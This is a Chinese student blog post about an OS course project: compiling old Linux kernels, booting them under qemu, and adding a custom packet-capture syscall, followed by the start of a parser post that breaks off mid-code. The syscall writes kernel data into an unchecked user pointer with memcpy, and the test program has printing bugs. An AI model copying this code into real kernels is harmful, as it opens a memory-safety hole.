FITNESS FOR A PARTICULAR PURPOSE. ruokeqx@ruokeqx:~$   编译linux-2.4 此前已经clone好2.4的源码，并已经在编译gcc时创建部分软链接\n下面部分代码创建软链接在我看的教程中说是确保这些链接是指向要升级的内核源代码（他事先删除了这个目录自带的），我的系统刚装没有动过就直接用自带的 linux和scsi的目录了（asm好像是上面编译gcc时创建的软链接）\n1 2 3 4 5 6 7 8  # 四舍五入这里用不到（doge cd /usr/include # rm -r asm linux scsi # 这里软链接还是用之前编译gcc用到的asm，下面这条编译会报错没有asm/boot.h # sudo ln -s /usr/src/linux-headers-4.4.0-142/include/asm-generic asm # 这里下面两个系统自带了 # sudo ln -s /usr/src/linux-headers-4.4.0-142/include/linux linux # sudo ln -s /usr/src/linux-headers-4.4.0-142/include/scsi scsi   配置内核，这部分还是特别重要且相对麻烦的 [具体看链接8]，但是由于与本次实验无关，所以直接使用默认值了。\n1 2 3 4  make config\t#（基于文本的最为传统的配置界面，不推荐使用） make menuconfig\t#（基于文本选单的配置界面，字符终端下推荐使用） make xconfig\t#（基于图形窗口模式的配置界面，Xwindow下推荐使用） make oldconfig\t#（如果只想在原来内核配置的基础上修改一些小地方，会省去不少麻烦）   编译\n1 2 3 4 5 6 7 8 9 10 11 12  # 读取配置生成的配置文件 来创建对应于配置的依赖关系树 make dep # 删除前面步骤留下的文件 make clean # 完全编译内核 make bzImage # 后面三个命令只有在你进行配置的过程中，在回答Enable loadable module support (CONFIG_MODULES)时选了\u0026#34;Yes\u0026#34;才是必要的，默认是[*] built-in # make modules和make modules_install分别生成相应的模块和把模块拷贝到需要的目录中 make modules sudo make modules_install # 生成模块间的依赖关系，启动新内核之后，使用modprobe命令加载模块时就能正确地定位模块 depmod -a   编译时报错如下，变量未声明，github搜变量名看到值都是0X7F00，于是编辑源码加上一句，编译成功。\n1 2 3 4  tools/build.c:155:error: ‘DEF_SYSSIZE’ undeclared (first use in this function) vim [source path]/arch/x86_64/boot/tools/build.c +37 #define DEF_SYSSIZE 0x7F00   编译成功（也只能说仅仅是编译成功了，具体继续往下看），文件路径为\n1 2  [source path]/System.map [source path]/arch/x86_64/boot/bzImage   qemu内核运行及调试 安装qemu\n1 2  cp linux-2.4/arch/x86_64/boot/bzImage ./ sudo apt install qemu   制作initrd(initial ramdisk), 在内核启动的时候会先去加载的一种文件系统[见参考14]\n[If you have Linux Kernel 2.4 or later, you already have support of ramdisk built in.] kernel2.4刚好是支持ramdisk的最早版本\n1 2 3 4 5 6 7 8 9 10 11  #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello ruokeqx\u0026#34;); printf(\u0026#34;hello ruokeqx\u0026#34;); printf(\u0026#34;hello ruokeqx\u0026#34;); fflush(stdout); while(1); return 0; }   静态编译并运行\n1 2  gcc -static -o helloworld hello.c echo helloworld | cpio -o --format=newc \u0026gt; rootfs   常规操作应该是使用busybox:[嵌入式linux的瑞士军刀，包含基本命令] 来构建文件系统，然后再qemu运行。\n但是 qemu的-kernel和-initrd能够绕过bootload直接对指定的kernel和ramdisk进行加载，上面echo那行命令就是创建cpio-initrd的过程。\n运行中的亿点问题 1 2 3 4 5 6  \u0026gt; qemu-system-x86_64 -kernel ./bzImage -initrd ./rootfs -append \u0026#34;root=/dev/ram rdinit=/helloworld\u0026#34; # 报错如下 RAMDISK: Couldn\u0026#39;t find valid RAM disk image starting at 0. VFS: Cannot open root device \u0026#34;ram\u0026#34; or 08:01 Please append a correct \u0026#34;root=\u0026#34; boot option Kernel panic: VFS: Unable to mount root fs on 08:01   发现我的系统没有/dev/ram，查找/dev下设备文件意义得到如下\n1 block RAM disk [已过时，请用TMPFS]\r0 = /dev/ram0 第1个 RAM disk\r1 = /dev/ram1 第2个 RAM disk\r[说明]将/dev/ram0用作initrd的做法已过时(因为它仅针对image-initrd格式)，当下的主流是cpio-initrd格式。\r以下目录被保留用于挂载特殊的文件系统。这些特殊的文件系统只提供内核接口而不提供标准的设备节点。\r/dev/shm tmpfs 提供对 POSIX 共享内存的直接访问\r于是尝试\n1  sudo qemu-system-x86_64 -kernel ./bzImage -initrd ./rootfs -append \u0026#34;root=/dev/shm rdinit=/helloworld\u0026#34;   还是相同报错，只不过上面的ram变成了shm.\n尝试过换到ubuntu18.04，依旧是一堆报错\n1 2 3 4 5  WARNING: Image format was not specified for \u0026#39;rootfs\u0026#39; and probing guessed raw. Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted. Specify the \u0026#39;raw\u0026#39; format explicitly to remove the restrictions. #\t-drive format=raw,file=rootfs   虚拟化问题\n1 2 3  warning: TCG doesn\u0026#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5] # 虚拟机处理器开启 虚拟化 Intel VT-x/EPT 或 AMD-V/RVI(V)   制作磁盘镜像\n1 2 3 4 5 6  # qemu-img 创建一个磁盘镜像文件 qemu-img create -f raw disk.raw 512M # 格式化为ext4 mkfs -t ext4 ./disk.raw # 挂在磁盘镜像文件，这样就可以操作磁盘镜像文件中的内容了 sudo mount -o loop ./disk.raw ./img   1 2 3 4  Kernel panic: Attempted to kill the idle task! In idle task - not syncing Kernel panic: Attempted to kill init!   放弃initrd运行kernel2.4 一堆问题，自闭了。\n看了一道朋友博客的kernelpwn题，拿到附件用他的环境尝试运行我的程序，发现成功。步骤如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # 现成内核和rootfs.cpio运行编译好的程序helloworld ls babydriver.i64 babydriver.tar.xz boot.sh bzImage rootfs.cpio mkdir tmp cp rootfs.cpio ./tmp/rootfs.cpio.gz cd tmp/ gunzip ./rootfs.cpio.gz cpio -idmv \u0026lt; rootfs.cpio .... ls .... cp ../../helloworld ./ echo /helloworld \u0026gt; init find . | cpio -o --format=newc \u0026gt; rootfs.cpio mv rootfs.cpio ../ cd .. ./boot.sh   然后用他的bzImgae替换我的程序后成功运行\n1 2 3 4 5 6  echo helloworld | cpio -o --format=newc \u0026gt; rootfs cp kernelpwn/bzImage ./ qemu-system-x86_64 \\ \t-kernel ./bzImage \\ \t-initrd ./rootfs \\ \t-append \u0026#34;root=/dev/ram rdinit=/helloworld\u0026#34;   那么现在可以确定是我编译的内核有问题（\n看了https://wiki.debian.org/Initrd后，发现kernel2.4只支持block-disk image，不支持cpio archive，需要用mkinitrd创建镜像，而ubuntu14.04都只自带initramfs而没mkinitrd，似乎连apt源中都移除了initrd-tools；好像也跟发行版有关系，centos7中还使用mkinitrd.\nKernel up to 2.4 were expecting the initrd file to be a (compressed) block-disk image (i.e formated as ext2 or minix fs). the initrd was created using mkinitrd.\rKernel 2.6 is expecting the initrd file to be a (compressed) cpio archive, to be uncompressed in a ramdisk, known as initramfs.\r至少可以确定的是在debian系近十年的发行版中编译并用initrd运行kernel2.4几乎是不可能的（\n尝试使用busybox 1 2 3 4 5 6 7  qemu-img create -f raw disk.raw 512M mkfs -t ext2 ./disk.raw mkdir img sudo mount -o loop ./disk.raw ./img # 刚才kernelpwn的题目自带的busybox直接拷贝过来 sudo cp -r tmp/* ./img/ qemu-system-x86_64 -m 512M -smp 4 -kernel bzImage.2.4 -drive format=raw,file=./disk.raw --append \u0026#34;init=/linuxrc root=/dev/sda\u0026#34;   kernel2.4仍然报错\nreiserfs_read_super can not find reiserfs on ramdisk(1,0)\rKernel panic: Attempted to kill init!\r尝试kernel2.6（这里的镜像是后面initrd运行kernel2.6编译的）\n1 2 3 4 5  qemu-system-x86_64 -m 512M -smp 4 -kernel bzImage.2.6 -drive format=raw,file=./disk.raw --append \u0026#34;init=/linuxrc root=/dev/sda\u0026#34; can\u0026#39;t open /dev/tty2: No such file or directory can\u0026#39;t open /dev/tty3: No such file or directory can\u0026#39;t open /dev/tty4: No such file or directory   busybox init启动后会扫描/etc/inittab ，没有的话就用下面的默认配置，所以会tty报错\n1 2 3 4 5 6 7 8 9  ::sysinit:/etc/init.d/rcS ::askfirst:/bin/sh ::ctrlaltdel:/sbin/reboot ::shutdown:/sbin/swapoff -a ::shutdown:/bin/umount -a -r ::restart:/sbin/init tty2::askfirst:/bin/sh tty3::askfirst:/bin/sh tty4::askfirst:/bin/sh   我们创建文件内容\n1 2 3 4 5 6 7 8 9  # /etc/inittab ::sysinit:/etc/init.d/rcS ::askfirst:/bin/ash ::ctrlaltdel:/sbin/reboot ::shutdown:/sbin/swapoff -a ::shutdown:/bin/umount -a -r ::restart:/sbin/init # /etc/init.d/rcS #!/bin/sh   kernel2.6成功运行\n尝试initrd运行kernel2.6 gcc换回4.8.4直接一遍编译成功\n1 2 3 4 5 6  make menuconfig make make bzImage cp arch/x86_64/boot/bzImage ./ cp bzImage ../bzImage2.6 qemu-system-x86_64 -kernel ./bzImage.2.6 -initrd ./rootfs -append \u0026#34;root=/dev/shm rdinit=/helloworld\u0026#34;   编写shell脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  #!/bin/sh  cd linux-5.15.6 if [ $1 ]; then make -j12 fi # make bzImage cp arch/x86/boot/bzImage ../ cd .. gcc -static -o fs/ruokeqx check_syscall.c -g #gcc -static -o fs/ruokeqx cap.c -g cd fs find . -print0 | cpio --null -ov --format=newc | gzip -9 \u0026gt; ../init.cpio.gz # find ruokeqx | cpio -o --format=newc \u0026gt; rootfs.cpio cd .. qemu-system-x86_64 \\ \t-kernel bzImage \\ \t-initrd init.cpio.gz \\ \t-nographic \\ \t-S -s \\ \t-net nic \\ \t-net tap,ifname=tap0,script=no,downscript=no \\ \t-append \u0026#34;console=ttyS0 nokaslr\u0026#34; \\ \t# -S -s # gdbserver #-append \u0026#34;console=ttyS0 rdinit=/ruokeqx\u0026#34;   内核源码阅读 1 2 3 4 5 6 7 8 9  # linux-5.9/include/uapi/linux/if_ether.h struct ethhdr {} __attribute__((packed)); # linux-5.9/include/uapi/linux/ip.h struct iphdr {}; # linux-5.9/include/uapi/linux/if_arp.h struct arphdr {}; # linux-5.9/net/socket.c int __sys_recvfrom(int fd, void __user *ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len)   添加系统调用 要添加系统调用大体需要三步\n1.先在arch/x86/entry/syscalls/syscall_64.tbl中分配调用号\n2.在include/linux/syscalls.h定义系统调用\n3.在内核任意区域添加SYSCALL_DEFINE并给出具体实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  // 系统调用表 // linux-5.9/arch/x86/entry/syscalls/syscall_64.tbl // # The format is: // # \u0026lt;number\u0026gt; \u0026lt;abi\u0026gt; \u0026lt;name\u0026gt; \u0026lt;entry point\u0026gt; // # 45\t64 recvfrom sys_recvfrom // 系统调用定义文件 // linux-5.9/kernel/sys.c // 服务例程的原型声明 // linux-5.9/include/linux/syscalls.h /* net/socket.c */ asmlinkage long sys_socket(int, int, int); asmlinkage long sys_socketpair(int, int, int, int __user *); asmlinkage long sys_bind(int, struct sockaddr __user *, int); asmlinkage long sys_listen(int, int); asmlinkage long sys_accept(int, struct sockaddr __user *, int __user *); asmlinkage long sys_connect(int, struct sockaddr __user *, int); asmlinkage long sys_getsockname(int, struct sockaddr __user *, int __user *); asmlinkage long sys_getpeername(int, struct sockaddr __user *, int __user *); asmlinkage long sys_sendto(int, void __user *, size_t, unsigned, struct sockaddr __user *, int); asmlinkage long sys_recvfrom(int, void __user *, size_t, unsigned, struct sockaddr __user *, int __user *); asmlinkage long sys_setsockopt(int fd, int level, int optname, char __user *optval, int optlen); asmlinkage long sys_getsockopt(int fd, int level, int optname, char __user *optval, int __user *optlen); asmlinkage long sys_shutdown(int, int); asmlinkage long sys_sendmsg(int fd, struct user_msghdr __user *msg, unsigned flags); asmlinkage long sys_recvmsg(int fd, struct user_msghdr __user *msg, unsigned flags);   注意点\nkernel\r不同的函数\rprintk()\rkmalloc(size,mem_type)\rkfree()\rfor(int i=0;i\u0026lt;10;++i)的写法是错的 c语言版本不支持在for中定义\r查看内核日志\rsudo dmesg\r跟踪程序系统调用\rsudo strace sudo ./check_syscall\r源码 net/socket.c\ninclude \u0026lt;linux/if_ether.h\u0026gt;#include \u0026lt;linux/ip.h\u0026gt;#include \u0026lt;linux/tcp.h\u0026gt;#include \u0026lt;linux/udp.h\u0026gt;#include \u0026lt;linux/if_arp.h\u0026gt;// #include \u0026lt;stdio.h\u0026gt; // #include \u0026lt;stdlib.h\u0026gt;  //参考内核 struct ethhdr 定义 (include/uapi/linux/if_ether.h） //参考内核 struct iphdr 定义（include/uapi/linux/ip.h） //参考内核 struct tcphdr 定义（include/uapi/linux/tcp.h） //参考内核 struct udphdr 定义（include/uapi/linux/udp.h） //参考内核 struct arphdr 定义（include/uapi/linux/if_arp.h） struct struct_packet { unsigned char\tmac_dest[ETH_ALEN]; unsigned char\tmac_source[ETH_ALEN]; __be16\teth_proto;\t/* packet type ID field\t*/ __be32\tip_source; __be32\tip_dest; // tools/include/uapi/linux/in.h \t// 1icmp/2igmp/6tcp/17udp \t__u8\tip_proto; __be16\tport_source; __be16\tport_dest; }; // unsigned int htonl(unsigned int\tx) // { // unsigned int y; // ((unsigned char*)\u0026amp;y)[0]= ((unsigned char*)\u0026amp;x)[3]; // ((unsigned char*)\u0026amp;y)[1]= ((unsigned char*)\u0026amp;x)[2]; // ((unsigned char*)\u0026amp;y)[2]= ((unsigned char*)\u0026amp;x)[1]; // ((unsigned char*)\u0026amp;y)[3]= ((unsigned char*)\u0026amp;x)[0]; // return y; // } // unsigned short htons(unsigned short x) // { // unsigned short y; // ((unsigned char*)\u0026amp;y)[0]= ((unsigned char*)\u0026amp;x)[1]; // ((unsigned char*)\u0026amp;y)[1]= ((unsigned char*)\u0026amp;x)[0]; // return y; // }  /* char * memp pointer for data int caplen cap number of packet return -1 on error 0 for success */ int __sys_cap(char * memp, int caplen) { #ifndef BUFFER_MAX #define BUFFER_MAX 4096 #endif \tint len,i; int\tsock; // https://www.kernel.org/doc/htmldocs/kernel-api/API-kmalloc.html \t// https://www.kernel.org/doc/htmldocs/kernel-api/API-kfree.html \tchar * buffer = kmalloc(BUFFER_MAX, GFP_KERNEL); struct struct_packet *s_packet; struct ethhdr *mac_hdr; struct iphdr *ip_hdr; struct tcphdr *tcp_hdr; struct udphdr *udp_hdr; struct arphdr *arp_hdr; if( (sock = __sys_socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) \u0026lt; 0 ){ printk(\u0026#34;Create socket error.\\n\u0026#34;); return -1; // exit(0); \t} while(caplen--){ len = __sys_recvfrom(sock, buffer, BUFFER_MAX, 0, NULL, NULL); printk(\u0026#34;len:%d\u0026#34;,len); for(i=0;i\u0026lt;len;++i){ printk(\u0026#34;%02x \u0026#34;,(unsigned char)buffer[i]); } if (len \u0026lt; 46) { printk(\u0026#34;Catch packet length error.\\n\u0026#34; ); __sys_shutdown(sock, 2); // close(sock); \treturn -1; // exit(0); \t} // copy_to_user(memp, ,); \t// printk(\u0026#34;截获内容长度 %d\\n\u0026#34;, len);  // sizeof(struct ethhdr) = 14 \t// sizeof(struct ipdhr) = 20 \t// sizeof(struct arpdhr) = 28\t6 4 Sender_ip 6 4 Target_ip \tmac_hdr = (struct ethhdr *)buffer; s_packet = (struct struct_packet *)mac_hdr; /* s_packet-\u0026gt;mac_dest[0] = mac_hdr-\u0026gt;h_dest[0]; s_packet-\u0026gt;mac_dest[1] = mac_hdr-\u0026gt;h_dest[1]; s_packet-\u0026gt;mac_dest[2] = mac_hdr-\u0026gt;h_dest[2]; s_packet-\u0026gt;mac_dest[3] = mac_hdr-\u0026gt;h_dest[3]; s_packet-\u0026gt;mac_dest[4] = mac_hdr-\u0026gt;h_dest[4]; s_packet-\u0026gt;mac_dest[5] = mac_hdr-\u0026gt;h_dest[5]; s_packet-\u0026gt;mac_source[0] = mac_hdr-\u0026gt;h_source[0]; s_packet-\u0026gt;mac_source[1] = mac_hdr-\u0026gt;h_source[1]; s_packet-\u0026gt;mac_source[2] = mac_hdr-\u0026gt;h_source[2]; s_packet-\u0026gt;mac_source[3] = mac_hdr-\u0026gt;h_source[3]; s_packet-\u0026gt;mac_source[4] = mac_hdr-\u0026gt;h_source[4]; s_packet-\u0026gt;mac_source[5] = mac_hdr-\u0026gt;h_source[5]; s_packet-\u0026gt;eth_proto = mac_hdr-\u0026gt;h_proto; */ switch(s_packet-\u0026gt;eth_proto){ case htons(0x0800):\t// ip \tip_hdr = (struct iphdr *)(buffer + sizeof(struct ethhdr)); s_packet-\u0026gt;ip_source = ip_hdr-\u0026gt;saddr; s_packet-\u0026gt;ip_dest = ip_hdr-\u0026gt;daddr; // p = (char*)\u0026amp;ip_hdr-\u0026gt;saddr; \t// printk(\u0026#34;源 IP: %d.%d.%d.%d\u0026#34;, \t// (u_char)p[0], \t// (u_char)p[1], \t// (u_char)p[2], \t// (u_char)p[3] \t// );  // p = (char*)\u0026amp;ip_hdr-\u0026gt;daddr; \t// printk(\u0026#34; ==\u0026gt; 目的 IP: %d.%d.%d.%d\\n\u0026#34;, \t// (u_char)p[0], \t// (u_char)p[1], \t// (u_char)p[2], \t// (u_char)p[3] \t// );  s_packet-\u0026gt;ip_proto = ip_hdr-\u0026gt;protocol; switch(s_packet-\u0026gt;ip_proto) { case IPPROTO_ICMP: s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; case IPPROTO_IGMP: s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; case IPPROTO_IPIP: break; case IPPROTO_TCP: tcp_hdr = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr)); s_packet-\u0026gt;port_source = tcp_hdr-\u0026gt;source; s_packet-\u0026gt;port_dest = tcp_hdr-\u0026gt;dest; break; case IPPROTO_UDP: udp_hdr = (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr)); s_packet-\u0026gt;port_source = udp_hdr-\u0026gt;source; s_packet-\u0026gt;port_dest = udp_hdr-\u0026gt;dest; break; case IPPROTO_RAW: break; default: break; } // printk(\u0026#34;协议类型:\u0026#34;); \t// switch(ip_hdr-\u0026gt;protocol) { \t// case IPPROTO_ICMP: \t// printk(\u0026#34;ICMP\u0026#34;); \t// break; \t// case IPPROTO_IGMP: \t// printk(\u0026#34;IGMP\u0026#34;); \t// break; \t// case IPPROTO_IPIP: \t// printk(\u0026#34;IPIP\u0026#34;); \t// break; \t// case IPPROTO_TCP: \t// printk(\u0026#34;TCP\u0026#34;); \t// break; \t// case IPPROTO_UDP: \t// printk(\u0026#34;UDP\u0026#34;); \t// break; \t// case IPPROTO_RAW: \t// printk(\u0026#34;RAW\u0026#34;); \t// break; \t// default: \t// printk(\u0026#34;Unknown type\u0026#34;); \t// break; \t// } \tbreak; case htons(0x0806): // arp \tarp_hdr = (struct arphdr *)(buffer + sizeof(struct ethhdr)); // however #if 0 in kernel if_arp.h ip not compiled \t// RFC 826 ARP packets are variable in size \t// https://sites.uclouvain.be/SystInfo/usr/include/net/if_arp.h.html \t// s_packet-\u0026gt;ip_source = (__be32 *)arp_hdr-\u0026gt;ar_sip;  // s_packet-\u0026gt;ip_dest = (__be32 *)arp_hdr-\u0026gt;ar_tip;  s_packet-\u0026gt;ip_source = 0; s_packet-\u0026gt;ip_dest = 0; s_packet-\u0026gt;ip_proto = 0; s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; default: s_packet-\u0026gt;ip_source = 0; s_packet-\u0026gt;ip_dest = 0; s_packet-\u0026gt;ip_proto = 0; s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; } memcpy(memp, s_packet, sizeof(struct struct_packet)); memp += sizeof(struct struct_packet); } kfree(buffer); // how 0 read/1 trans/2 read and trans \t__sys_shutdown(sock, 2); // close(sock); \treturn 0; } SYSCALL_DEFINE2(cap, char * , memp , int, caplen) { return __sys_cap(memp, caplen); } // arch/x86/entry/syscalls/syscall_64.tbl // 335 64 cap sys_cap  // include/linux/syscalls.h // asmlinkage long sys_cap(FILE *f, int caplen)   check_syscall.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;linux/if_ether.h\u0026gt;#include \u0026lt;linux/in.h\u0026gt;#include \u0026lt;sys/syscall.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#define SYSCALL_CAP 335  struct struct_packet { unsigned char\tmac_dest[ETH_ALEN]; unsigned char\tmac_source[ETH_ALEN]; __be16\teth_proto; __be32\tip_source; __be32\tip_dest; __u8\tip_proto; __be16\tport_source; __be16\tport_dest; }; int main() { int caplen = 10; int memsize = caplen * sizeof(struct struct_packet); char * memp = malloc(memsize); int res = syscall(SYSCALL_CAP, memp, caplen); // int res = cap(memp, caplen);  if (res){ printf(\u0026#34;error:%d\\n\u0026#34;,res); exit(1); } for (int i=0;i\u0026lt;10;++i){ for (int y=0;y\u0026lt;10;++y){ printf(\u0026#34;%02x \u0026#34;,(unsigned char)memp++); } printf(\u0026#34;\\n\u0026#34;); } return 0; }   调试内核 前置：qemu及pwndbg的安装\ngdb配合qemu调试 qemu参数-S -s启动gdbserver，gdb连上remote即可\n1 2 3  qemu-system-x86_64 ... -S -s gdb vmlinux target remote:1234   1 2 3 4 5 6 7  int __sys_recvfrom(int fd, void __user *ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len){ err = import_single_range(READ, ubuf, size, \u0026amp;iov, \u0026amp;msg.msg_iter); // -14 kernel  // 0 user } 0xffff888005549000   gdb调内核发现内存写入失败\n网络环境\n1 2 3 4 5  apt-get update # 虚拟网桥工具 apt-get install bridge-utils # UML（User-mode linux）工具 apt-get install uml-utilities   qemu默认支持的是e1000网卡，内核中需要开启如下的配置项来支持e1000\n否则启动ifconfig -a只有一个lo设备\n1 2 3 4 5  Device Drivers ---\u0026gt; [*] Network device support ---\u0026gt; [*] Ethernet driver support ---\u0026gt; [*] Intel devices \u0026lt;*\u0026gt; Intel(R) PRO/1000 Gigabit Ethernet support   # 十六进制打印a开始的16个byte类型内存\rx/16xb a\r添加文件加密 dm-crypt/cryptsetup\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ➜ ~ cryptsetup benchmark # Tests are approximate using memory only (no storage IO). PBKDF2-sha1 1705001 iterations per second for 256-bit key PBKDF2-sha256 2111935 iterations per second for 256-bit key PBKDF2-sha512 1600879 iterations per second for 256-bit key PBKDF2-ripemd160 894689 iterations per second for 256-bit key PBKDF2-whirlpool 661979 iterations per second for 256-bit key argon2i 6 iterations, 1048576 memory, 4 parallel threads (CPUs) for 256-bit key (requested 2000 ms time) argon2id 7 iterations, 1048576 memory, 4 parallel threads (CPUs) for 256-bit key (requested 2000 ms time) # Algorithm | Key | Encryption | Decryption aes-cbc 128b 1068.9 MiB/s 2818.5 MiB/s serpent-cbc 128b 94.4 MiB/s 673.9 MiB/s twofish-cbc 128b 210.6 MiB/s 375.6 MiB/s aes-cbc 256b 846.1 MiB/s 2375.5 MiB/s serpent-cbc 256b 96.7 MiB/s 695.6 MiB/s twofish-cbc 256b 217.7 MiB/s 391.6 MiB/s aes-xts 256b 2632.3 MiB/s 2713.3 MiB/s serpent-xts 256b 673.6 MiB/s 687.9 MiB/s twofish-xts 256b 374.1 MiB/s 369.8 MiB/s aes-xts 512b 2248.3 MiB/s 2264.3 MiB/s serpent-xts 512b 685.4 MiB/s 693.5 MiB/s twofish-xts 512b 371.9 MiB/s 375.6 MiB/s   参考文献 [1]https://git.kernel.org/pub/scm/linux/kernel/git/wtarreau/linux-2.4.git/[source]\n[2]https://kernel.googlesource.com/pub/scm/linux/kernel/git/wtarreau/linux-2.4.git/[source]\n[3]https://github.com/torvalds/linux[kernel]\n[4]https://linux.cn/article-9665-1.html[kernel make]\n[5]https://www.linux.com/topic/desktop/how-compile-linux-kernel-0/[kernel make]\n[6]https://blog.csdn.net/Magic_Ninja/article/details/89058323[gcc]\n[7]https://stackoverflow.com/questions/34569458/error-occurred-compiling-gcc-from-source-code[gcc]\n[8]https://www.cnblogs.com/evilzy/archive/2008/03/30/1130179.html[kernel]\n[9]https://www.cnblogs.com/hellogc/p/7482066.html[qemu kernel std]\n[10]https://busybox.net/about.html[busybox]\n[11]https://blog.csdn.net/sinat_22597285/article/details/53783221?spm=1001.2014.3001.5501[qemu initrd]\n[12]https://blog.csdn.net/sinat_36184075/article/details/71598834[/dev/*]\n[13]https://fmyy.pro/2020/05/04/Kernel/Linux_Kernel_Pwn(%E4%B8%80)/#%E6%80%9D%E8%B7%AF[fmyy kernelpwn]\n[14]https://wiki.debian.org/Initrd[2.4\u0026rsquo;s initrd/2.6\u0026rsquo;s initramfs]\n[15]https://securitronlinux.com/debian-testing/compiling-and-installing-a-2-4-kernel-on-debian-gnu-linux-sarge/[make initrd 2.4/2.6]\n[16]https://www.centennialsoftwaresolutions.com/post/5-minute-user-space-hello-world-arm-cross-compile-copy-to-a-rootfs-and-run-on-qemu[busybox initramfs]\n[17]https://www.cnblogs.com/tsruixi/p/10777242.html [syscall hdu]\n[18]https://zhuanlan.zhihu.com/p/445453676 [vscode kernel dbg]\n[19]https://wzt.ac.cn/2021/05/28/QEMU-networking/ [qemu networking]\n[20]https://blog.csdn.net/gengzhikui1992/article/details/103142848 [libpcap speed]\n[21]https://program-think.medium.com/%E6%89%AB%E7%9B%B2-dm-crypt-%E5%A4%9A%E5%8A%9F%E8%83%BD-linux-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E5%B7%A5%E5%85%B7-%E5%85%BC%E5%AE%B9-truecrypt-veracrypt-80a932ae3492[dm-crypt]\n[22]https://www.cnblogs.com/pionice/p/13288942.html [os fs blog]\n[23]https://github.com/744717164/OSsciByGZHU/blob/master/OSscienceDesign/OsDesignByGama.cpp [osfilesystem]\n[24]https://blog.csdn.net/GerZhouGengCheng/article/details/106103039 [aes-256-cbc]\n[25]https://blog.csdn.net/u012234115/article/details/72762045 [md5 sha256]\n[26]https://www.runoob.com/cplusplus/cpp-files-streams.html [c++ fstream]\n","description":"","id":5,"section":"posts","tags":["课程"],"title":"操作系统课程设计","uri":"https://ruokeqx.gitee.io/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"content":"针对给定语法设计递归下降分析程序，以对任意输入的符号串进行语法分析。语法如下\n1 2 3 4 5  exp -\u0026gt; exp addop term | term addop -\u0026gt; + | - term = term mulop factor | factor mulop = * factor = ( exp ) | number   因为存在重复和选择，所以使用EBNF。\n1 2  exp -\u0026gt; term { addop term } term -\u0026gt; factor { mulop factor }   写成伪代码如下\n1 2 3 4 5 6 7 8 9  /* exp伪代码 */ procedure exp begin term; while token = + do match(token); term; end while; end exp;   1 2 3 4 5 6 7 8 9  /* term伪代码 */ procedure term begin factor; while token = * do match(token); factor; end while; end term;   1 2 3 4 5 6 7 8 9 10  /* factor伪代码 */ procedure factor begin if token = \u0026#39;(\u0026#39; match(\u0026#39;(\u0026#39;); exp; match(\u0026#39;)\u0026#39;); else getnumber; end factor;   1 2 3 4 5 6 7 8 9 10 11 12 13  /* exp构造语法树 */ function exp:syntaxTree; var temp,newtemp:syntaxTree; begin temp := term; while token = + do newtemp := makeOpNode(token); match(token); leftChild(newtemp) := temp; rightChile(newtemp) := term; temp := newtemp; end while; end exp;   1 2 3 4 5 6 7 8 9 10 11 12 13 14  /* term构造语法树 */ function term:syntaxTree; var temp,newtemp:syntaxTree; begin temp := factor; while token = * do newtemp := makeOpNode(token); match(token); leftChild(newtemp) := temp; rightChile(newtemp) := factor; temp := newtemp; end while; return temp; end term;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  /* factor构造语法树 */ function factor:syntaxTree; var temp:syntaxTree; begin if token = \u0026#39;(\u0026#39; match(\u0026#39;(\u0026#39;) temp := makeOpNode(exp); leftChild(temp) := null; rightChile(temp) := null; match(\u0026#39;)\u0026#39;) else if isdigit(token) temp := makeOpNode(token); leftChild(temp) := null; rightChile(temp) := null; else error reutrn temp; end factor;   完整代码如下,基本思路就是getchar预先获取一个char用以进行预测性解析,然后递归构造语法树并打印出来.\n如果匹配到运算符就构造新的节点加到原来的树上;如果匹配到单个数字,那么就使用ungetc将数字返回输入流然后用scanf(\u0026quot;%d\u0026quot;)来匹配多位number.\n刚开始程序以c语言实现,但是只能处理单位数字,考虑到所有节点数据一致,干脆改到c++使用string.这里遇到一点问题,刚开始c语言的时候data为char类型,树节点用malloc获取空间,改到c++后结构体内string类型不能用malloc类型,因为初始化并定长了,改用new和delete后解决问题.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;cstdio\u0026gt;#include \u0026lt;stdlib.h\u0026gt;using namespace std; /*树节点*/ typedef struct node { string data; struct node* left; struct node* right; }Node; void printTree(Node* n, int type, int level); void destroy_node(Node*); Node* makeNode(string); char token; Node* exp(); Node* term(); Node* 